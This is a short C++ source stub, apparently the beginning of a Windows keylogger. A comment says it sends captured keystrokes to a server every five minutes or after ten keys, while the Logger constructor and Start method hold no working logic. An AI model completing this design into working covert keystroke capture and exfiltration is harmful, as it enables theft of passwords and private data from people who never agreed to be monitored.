#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include "Logger.h"

/// send keystrokes to server every 300 seconds (5 minutes)
/// or if user types a total of 10 keys
Logger::Logger(Communicator communicator) {
	_communicator = communicator;
}

void Logger::Start() {

}